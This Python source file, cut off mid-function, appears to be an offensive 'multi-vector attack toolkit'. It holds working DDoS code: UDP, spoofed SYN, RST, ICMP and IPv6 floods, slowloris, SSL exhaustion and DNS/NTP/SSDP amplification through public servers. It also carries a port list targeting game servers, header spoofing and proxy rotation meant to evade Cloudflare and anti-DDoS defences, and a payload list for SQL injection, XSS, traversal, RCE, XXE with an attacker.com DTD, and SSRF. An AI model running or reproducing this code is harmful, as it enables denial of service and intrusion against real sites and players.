#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re
import json
import time
import random
import socket
import ssl
import threading
import subprocess
import platform
import hashlib
import base64
import gzip
import zlib
import struct
import binascii
import ipaddress
import asyncio
import aiohttp
import http.client
import urllib.parse
import queue
import logging
import signal
import ctypes
import inspect
import traceback
import csv
import tempfile
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, urlencode
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, Counter, deque
from typing import Dict, List, Tuple, Optional, Any, Callable
import warnings
warnings.filterwarnings('ignore')

# ================================ DEPENDENCY INSTALLER ================================

def install_dependencies():
    deps = [
        "cloudscraper", "colorama", "requests", "aiohttp", "websocket-client",
        "brotli", "cryptography", "pyOpenSSL", "dnspython", "psutil",
        "pysocks", "curl_cffi", "whois", "scapy", "paramiko", "impacket"
    ]
    for dep in deps:
        try:
            __import__(dep.replace("-", "_"))
        except ImportError:
            subprocess.run([sys.executable, "-m", "pip", "install", dep], capture_output=True)
            time.sleep(0.3)

print("[*] Checking and installing dependencies...")
install_dependencies()

# Import modules
try:
    import cloudscraper
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    import aiohttp
    import websocket
    import dns.resolver
    import dns.query
    import dns.zone
    import whois
    import curl_cffi.requests as curl_requests
    import psutil
    from scapy.all import *
    import paramiko
    import impacket
except Exception as e:
    print(f"[!] Installing core dependencies...")
    subprocess.run([sys.executable, "-m", "pip", "install", "cloudscraper", "colorama", "requests", "aiohttp", "websocket-client", "brotli", "cryptography", "pyOpenSSL", "dnspython", "pysocks", "curl_cffi", "whois", "psutil", "scapy", "paramiko", "impacket"])
    import cloudscraper
    import requests
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    import aiohttp
    import curl_cffi.requests as curl_requests
    import psutil

# ================================ KONFIGURASI GLOBAL ================================

VERSION = "3.2.8"

# Default values (will be updated by system detection)
CPU_COUNT = 4
RAM_GB = 8
MAX_THREADS = 50000
MAX_CONNECTIONS = 35000
PROXY_LIST = []
USER_AGENT_LIST = []
PAYLOAD_DATABASE = {}
ATTACK_LOG = []

def detect_system_resources():
    global CPU_COUNT, RAM_GB, MAX_THREADS, MAX_CONNECTIONS
    try:
        CPU_COUNT = psutil.cpu_count(logical=True)
        RAM_GB = psutil.virtual_memory().total / (1024**3)
        
        if RAM_GB >= 32:
            MAX_THREADS = 200000
            MAX_CONNECTIONS = 150000
        elif RAM_GB >= 16:
            MAX_THREADS = 120000
            MAX_CONNECTIONS = 90000
        elif RAM_GB >= 8:
            MAX_THREADS = 70000
            MAX_CONNECTIONS = 50000
        elif RAM_GB >= 4:
            MAX_THREADS = 30000
            MAX_CONNECTIONS = 20000
        else:
            MAX_THREADS = 10000
            MAX_CONNECTIONS = 8000
        return True
    except:
        return False

detect_system_resources()

BANNER = f"""
{Fore.RED}{Style.BRIGHT}
░█▀▄ ░█▀█ ░█▀▄ ░█░█ ░▀█▀ ░█░█ ░█▀█ ░█▀▄ ░█▀█
░█░█ ░█▀█ ░█▀▄ ░█▀▄ ░░█░ ░█▀█ ░█░█ ░█▀▄ ░█░█
░▀▀░ ░▀░▀ ░▀░▀ ░▀░▀ ░▀▀▀ ░▀░▀ ░▀▀▀ ░▀░▀ ░▀░▀
─────────────────────────────────────────────
               SIGNATURE EDITION v{VERSION}
 [+] ADVANCED MULTI-VECTOR ATTACK TOOLKIT
 ─────────────────────────────────────────────                                                 
{Style.RESET_ALL}
{Fore.CYAN}[+] System: {CPU_COUNT} Cores | {RAM_GB:.1f} GB RAM | Platform: {platform.system()}{Style.RESET_ALL}
{Fore.GREEN}[+] Max Threads: {MAX_THREADS:,} | Max Connections: {MAX_CONNECTIONS:,}{Style.RESET_ALL}
{Fore.YELLOW}[+] Auto-Detection Engine v4.0 Active | AI-Powered Attack Selection{Style.RESET_ALL}
{Fore.MAGENTA}[+] Website Attack: 20 Methods | Server Attack: 15 Methods | Combined: 5 Variants{Style.RESET_ALL}
{Fore.RED}[+] Cloudflare L3/L4/L7 Bypass | Anti-DDoS Evasion | Zero-Day Exploits{Style.RESET_ALL}
{Fore.CYAN}[+] Proxy Support: HTTP/HTTPS/SOCKS4/SOCKS5 | Auto-Proxy Scraper Active{Style.RESET_ALL}
{Fore.GREEN}[+] Payload Generator: SQLi | XSS | LFI | RCE | XXE | SSRF | Deserialization{Style.RESET_ALL}
"""

# Global variables
stats = {
    "requests_sent": 0,
    "bytes_sent": 0,
    "errors": 0,
    "start_time": None,
    "methods_used": defaultdict(int),
    "bandwidth_history": deque(maxlen=60),
    "rps_history": deque(maxlen=60)
}
stats_lock = threading.Lock()
stop_attack = threading.Event()
user_agents = []
proxy_working = []
current_proxy_index = 0
payload_templates = {}

def get_random_ua():
    return random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def get_random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def get_random_ipv6():
    return f"2001:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}:{random.randint(0,0xffff):x}"

def get_random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def get_random_headers(host=None, bypass_level="normal"):
    headers = {
        'User-Agent': get_random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9,id;q=0.8,ja;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    
    # Enhanced spoofing headers
    headers['X-Forwarded-For'] = get_random_ip()
    headers['X-Real-IP'] = get_random_ip()
    headers['X-Originating-IP'] = get_random_ip()
    headers['X-Remote-IP'] = get_random_ip()
    headers['X-Remote-Addr'] = get_random_ip()
    headers['True-Client-IP'] = get_random_ip()
    headers['CF-Connecting-IP'] = get_random_ip()
    headers['X-Client-IP'] = get_random_ip()
    headers['X-Host'] = get_random_ip()
    headers['X-Forwarded-Host'] = get_random_ip()
    
    if bypass_level == "maximum":
        headers['CF-IPCountry'] = random.choice(['US', 'GB', 'DE', 'FR', 'JP', 'KR', 'SG', 'AU', 'BR', 'IN'])
        headers['CF-Visitor'] = '{"scheme":"https"}'
        headers['CDN-Loop'] = 'cloudflare'
        headers['X-Request-ID'] = hashlib.md5(str(random.random()).encode()).hexdigest()
        headers['X-Correlation-ID'] = hashlib.md5(str(random.random()).encode()).hexdigest()
        headers['X-Trace-ID'] = hashlib.md5(str(random.random()).encode()).hexdigest()
    
    if host:
        headers['Host'] = host
    
    return headers

def update_stats(sent=0, bytes_sent=0, error=False, method=None):
    with stats_lock:
        stats["requests_sent"] += sent
        stats["bytes_sent"] += bytes_sent
        if error:
            stats["errors"] += 1
        if method:
            stats["methods_used"][method] += sent
        
        # Update history
        if stats["start_time"]:
            elapsed = max(1, time.time() - stats["start_time"])
            current_rps = stats["requests_sent"] / elapsed
            stats["rps_history"].append(current_rps)
            stats["bandwidth_history"].append(stats["bytes_sent"] / 1024 / 1024)

def status_printer():
    while not stop_attack.is_set():
        if stats["start_time"]:
            elapsed = int(time.time() - stats["start_time"])
            elapsed_str = f"{elapsed // 3600:02d}:{(elapsed % 3600) // 60:02d}:{elapsed % 60:02d}"
            req_per_sec = stats["requests_sent"] / max(1, elapsed)
            avg_rps = sum(stats["rps_history"]) / max(1, len(stats["rps_history"]))
            peak_rps = max(stats["rps_history"]) if stats["rps_history"] else 0
        else:
            elapsed_str = "00:00:00"
            req_per_sec = 0
            avg_rps = 0
            peak_rps = 0
        
        sys.stdout.write(f"\r{Fore.CYAN}[⏱️] {elapsed_str} | "
                        f"Req: {stats['requests_sent']:,} ({req_per_sec:.0f}/s) | "
                        f"Avg: {avg_rps:.0f}/s | Peak: {peak_rps:.0f}/s | "
                        f"Data: {stats['bytes_sent']/1024/1024:.2f} MB | "
                        f"Err: {stats['errors']:,} | "
                        f"Thr: {threading.active_count()}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.3)

def load_user_agents():
    global user_agents
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
        'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
        'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (PlayStation 4 5.55) AppleWebKit/537.73 (KHTML, like Gecko)',
        'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko)',
        'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    ]
    # Load additional from file if exists
    if os.path.exists("user_agents.txt"):
        try:
            with open("user_agents.txt", "r") as f:
                for line in f:
                    if line.strip():
                        user_agents.append(line.strip())
        except:
            pass

def load_proxies():
    global proxy_working
    proxy_sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP_RAW.txt",
    ]
    
    all_proxies = set()
    for url in proxy_sources:
        try:
            resp = requests.get(url, timeout=15)
            for line in resp.text.splitlines():
                line = line.strip()
                if re.match(r'^\d+\.\d+\.\d+\.\d+:\d+$', line):
                    all_proxies.add(line)
                elif re.match(r'^\d+\.\d+\.\d+\.\d+:\d+@', line):
                    proxy = line.split('@')[1] if '@' in line else line
                    all_proxies.add(proxy)
        except:
            pass
    
    proxy_working = list(all_proxies)
    print(f"{Fore.GREEN}[+] Loaded {len(proxy_working)} proxies{Style.RESET_ALL}")
    return proxy_working

def get_next_proxy():
    global current_proxy_index
    if not proxy_working:
        return None
    proxy = proxy_working[current_proxy_index % len(proxy_working)]
    current_proxy_index += 1
    return proxy

def log_attack(target, method, threads, duration, requests_sent, data_sent):
    log_entry = {
        "timestamp": datetime.now().isoformat(),
        "target": target,
        "method": method,
        "threads": threads,
        "duration": duration,
        "requests_sent": requests_sent,
        "data_sent_mb": data_sent / 1024 / 1024,
        "errors": stats["errors"]
    }
    ATTACK_LOG.append(log_entry)
    
    # Save to file
    try:
        with open("attack_log.json", "a") as f:
            f.write(json.dumps(log_entry) + "\n")
    except:
        pass

# ================================ PAYLOAD GENERATOR ================================

class PayloadGenerator:
    @staticmethod
    def sql_injection_payloads():
        return [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT * FROM users -- ",
            "' UNION SELECT username, password FROM users -- ",
            "admin'--",
            "' AND 1=1 -- ",
            "' AND SLEEP(5) -- ",
            "' WAITFOR DELAY '0:0:5' -- ",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ",
            "'; DROP TABLE users; -- ",
            "'; DELETE FROM users WHERE '1'='1",
            "' OR 1=1; EXEC xp_cmdshell('dir') -- ",
            "1' ORDER BY 1-- ",
            "1' UNION SELECT null,null,null -- ",
        ]
    
    @staticmethod
    def xss_payloads():
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "'';!--\"<XSS>=&{()}",
            "<SCRiPT>alert(1)</SCRiPT>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<a href=\"javascript:alert(1)\">click</a>",
            "<div onmouseover=\"alert(1)\">hover</div>",
        ]
    
    @staticmethod
    def path_traversal_payloads():
        return [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "..../..../..../etc/passwd",
            "..;/..;/..;/etc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
        ]
    
    @staticmethod
    def rce_payloads():
        return [
            "; ls -la",
            "| ls -la",
            "`ls -la`",
            "$(ls -la)",
            "& dir",
            "| dir",
            "`dir`",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "; id",
            "| id",
            "`id`",
            "; whoami",
            "| whoami",
        ]
    
    @staticmethod
    def lfi_payloads():
        return [
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=config.php",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "expect://id",
            "php://input",
            "zip://file.zip%23inside.php",
            "phar://file.phar/test.php",
        ]
    
    @staticmethod
    def xxe_payloads():
        return [
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>''',
            '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&test;</root>''',
        ]
    
    @staticmethod
    def ssrf_payloads():
        return [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:3306",
            "http://localhost:6379/INFO",
            "http://localhost:9200/_cat/indices",
            "http://localhost:9090/metrics",
            "file:///etc/passwd",
            "gopher://localhost:3306/_",
            "dict://localhost:11211/",
        ]
    
    @staticmethod
    def deserialization_payloads():
        return [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
            'O:8:"Exception":2:{s:7:"file";s:11:"test.php";s:7:"line";i:0;}',
            'TzozMjoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czoxODoiAAAKcmVjZWl2ZXJzIjthOjA6e319',
        ]
    
    @staticmethod
    def generate_all_payloads():
        all_payloads = []
        all_payloads.extend(PayloadGenerator.sql_injection_payloads())
        all_payloads.extend(PayloadGenerator.xss_payloads())
        all_payloads.extend(PayloadGenerator.path_traversal_payloads())
        all_payloads.extend(PayloadGenerator.rce_payloads())
        all_payloads.extend(PayloadGenerator.lfi_payloads())
        all_payloads.extend(PayloadGenerator.xxe_payloads())
        all_payloads.extend(PayloadGenerator.ssrf_payloads())
        all_payloads.extend(PayloadGenerator.deserialization_payloads())
        return all_payloads

# ================================ GAME SERVER DATABASE  ================================

GAME_SERVER_PORTS = {
    30001: {"name": "Mobile Legends", "protocol": "UDP", "method": "game_ping", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    30002: {"name": "Mobile Legends", "protocol": "UDP", "method": "game_ping", "payload": b'\x01\x00\x00\x00\x00\x00\x00\x00'},
    27015: {"name": "Counter-Strike / PUBG", "protocol": "UDP", "method": "udp_flood", "payload": b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x00'},
    27016: {"name": "Counter-Strike / PUBG", "protocol": "UDP", "method": "udp_flood", "payload": b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x00'},
    27017: {"name": "Counter-Strike / PUBG", "protocol": "UDP", "method": "udp_flood", "payload": b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x00'},
    25565: {"name": "Minecraft Java", "protocol": "TCP", "method": "connection_exhaustion", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
    19132: {"name": "Minecraft Bedrock", "protocol": "UDP", "method": "udp_flood", "payload": b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'},
    7777: {"name": "ARK / Rust", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    28015: {"name": "Rust", "protocol": "UDP", "method": "udp_flood", "payload": b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'},
    9987: {"name": "TeamSpeak 3", "protocol": "UDP", "method": "amp_ddos", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27036: {"name": "Steam", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    3478: {"name": "Xbox/PlayStation", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    1935: {"name": "RTMP Server", "protocol": "TCP", "method": "slow_loris", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    5060: {"name": "SIP Server", "protocol": "UDP", "method": "udp_flood", "payload": b'REGISTER sip:server SIP/2.0\r\n'},
    8000: {"name": "Gaming Server", "protocol": "UDP/TCP", "method": "all", "payload": b''},
    9000: {"name": "Game Server", "protocol": "TCP", "method": "syn_flood", "payload": b''},
    2456: {"name": "Valheim", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    2457: {"name": "Valheim", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    2458: {"name": "Valheim", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27030: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27031: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27032: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27033: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27034: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27035: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27036: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27037: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27038: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27039: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
    27040: {"name": "Steam Game", "protocol": "UDP", "method": "udp_flood", "payload": b'\x00\x00\x00\x00\x00\x00\x00\x00'},
}

# ================================ SERVER ATTACK METHODS (15 METHODS) ================================

class ServerAttackMethods:
    
    @staticmethod
    def udp_flood_server(target_ip, target_port, threads=5000, packet_size=None):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                size = packet_size if packet_size else random.randint(64, 4096)
                payload = b'X' * size
                while not stop_attack.is_set():
                    sock.sendto(payload, (target_ip, target_port))
                    update_stats(sent=1, bytes_sent=len(payload), method="udp_flood")
                sock.close()
            except:
                update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def syn_flood_server(target_ip, target_port, threads=5000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                while not stop_attack.is_set():
                    source_ip = get_random_ip()
                    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 1500, 0, 64, 6, 0,
                                           socket.inet_aton(source_ip), socket.inet_aton(target_ip))
                    tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port,
                                           random.randint(1, 4294967295), 0, 5, 2, 8192, 0, 0)
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    update_stats(sent=1, method="syn_flood")
            except:
                while not stop_attack.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        s.connect((target_ip, target_port))
                        s.close()
                        update_stats(sent=1, method="syn_flood")
                    except:
                        update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def connection_exhaustion(target_ip, target_port, threads=8000):
        def worker():
            connections = []
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target_ip, target_port))
                    sock.send(b'X' * 1024)
                    connections.append(sock)
                    update_stats(sent=1, method="conn_exhaust")
                except:
                    update_stats(error=True)
                time.sleep(0.1)
                for conn in connections[:]:
                    try:
                        conn.send(b'\r\n')
                    except:
                        if conn in connections:
                            connections.remove(conn)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def amp_ddos_server(target_ip, target_port, threads=3000):
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            amplifiers = [
                ('8.8.8.8', 53, 'dns'), ('1.1.1.1', 53, 'dns'), ('8.8.4.4', 53, 'dns'),
                ('pool.ntp.org', 123, 'ntp'), ('time.google.com', 123, 'ntp'), ('time.windows.com', 123, 'ntp'),
                ('239.255.255.250', 1900, 'ssdp'), ('239.255.255.250', 1901, 'ssdp'),
                ('0.nl.pool.ntp.org', 123, 'ntp'), ('1.nl.pool.ntp.org', 123, 'ntp'),
                ('2.nl.pool.ntp.org', 123, 'ntp'), ('3.nl.pool.ntp.org', 123, 'ntp'),
            ]
            while not stop_attack.is_set():
                try:
                    amp_ip, amp_port, amp_type = random.choice(amplifiers)
                    if amp_type == 'dns':
                        query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x03www\x07' + target_ip.encode() + b'\x00\x00\x01\x00\x01'
                        sock.sendto(query, (amp_ip, amp_port))
                    elif amp_type == 'ntp':
                        sock.sendto(b'\x17\x00\x03\x2a' + b'\x00' * 44, (amp_ip, amp_port))
                    else:
                        sock.sendto(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n', (amp_ip, amp_port))
                    update_stats(sent=1, method="amp_ddos")
                except:
                    update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def slow_loris_server(target_ip, target_port, threads=5000):
        def worker():
            socks_list = []
            while not stop_attack.is_set():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.connect((target_ip, target_port))
                    sock.send(f"GET /{random.randint(0,999999)} HTTP/1.1\r\n".encode())
                    sock.send(f"Host: {target_ip}\r\n".encode())
                    sock.send("Connection: keep-alive\r\n".encode())
                    socks_list.append(sock)
                    update_stats(sent=1, method="slow_loris")
                except:
                    update_stats(error=True)
                for sock in socks_list[:]:
                    try:
                        sock.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
                    except:
                        if sock in socks_list:
                            socks_list.remove(sock)
                time.sleep(random.uniform(3, 8))
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def game_ping_flood(target_ip, target_port, threads=4000):
        def worker():
            payloads = [
                b'\x00\x00\x00\x00\x00\x00\x00\x00',
                b'\x01\x00\x00\x00\x00\x00\x00\x00',
                b'\x03\x00\x00\x00\x00\x00\x00\x00',
                b'PING' * 64,
                b'\xff\xff\xff\xff\x67\x65\x74\x73\x74\x61\x74\x75\x73\x00',
                b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                b'\xfe\xfd\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                b'\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
            ]
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop_attack.is_set():
                try:
                    payload = random.choice(payloads) * random.randint(1, 5)
                    sock.sendto(payload, (target_ip, target_port))
                    update_stats(sent=1, bytes_sent=len(payload), method="game_ping")
                except:
                    update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def ssl_exhaustion_server(target_ip, target_port=443, threads=3000):
        def worker():
            while not stop_attack.is_set():
                try:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
                    ssl_sock.connect((target_ip, target_port))
                    for _ in range(50):
                        if stop_attack.is_set():
                            break
                        ssl_sock.send(b'R' * 32768)
                        update_stats(sent=1, bytes_sent=32768, method="ssl_exhaust")
                    ssl_sock.close()
                except:
                    update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def icmp_flood_server(target_ip, threads=3000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                while not stop_attack.is_set():
                    packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + b'X' * 56
                    sock.sendto(packet, (target_ip, 0))
                    update_stats(sent=1, bytes_sent=64, method="icmp_flood")
            except:
                while not stop_attack.is_set():
                    try:
                        subprocess.run(['ping', '-c', '1', '-W', '1', target_ip], capture_output=True)
                        update_stats(sent=1, method="icmp_flood")
                    except:
                        update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def tcp_rst_flood(target_ip, target_port, threads=4000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                while not stop_attack.is_set():
                    source_ip = get_random_ip()
                    ip_header = struct.pack('!BBHHHBBH4s4s', 0x45, 0, 1500, 0, 64, 6, 0,
                                           socket.inet_aton(source_ip), socket.inet_aton(target_ip))
                    tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024, 65535), target_port,
                                           random.randint(1, 4294967295), 0, 5, 4, 8192, 0, 0)
                    sock.sendto(ip_header + tcp_header, (target_ip, 0))
                    update_stats(sent=1, method="tcp_rst")
            except:
                update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
    
    @staticmethod
    def ipv6_flood(target_ipv6, target_port, threads=3000):
        def worker():
            try:
                sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)
                while not stop_attack.is_set():
                    source_ipv6 = get_random_ipv6()
                    sock.sendto(b'X' * 1024, (source_ipv6, target_port))
                    update_stats(sent=1, bytes_sent=1024, method="ipv6_flood")
            except:
                update_stats(error=True)
        
        for _ in range(min(threads, MAX_THREADS)):
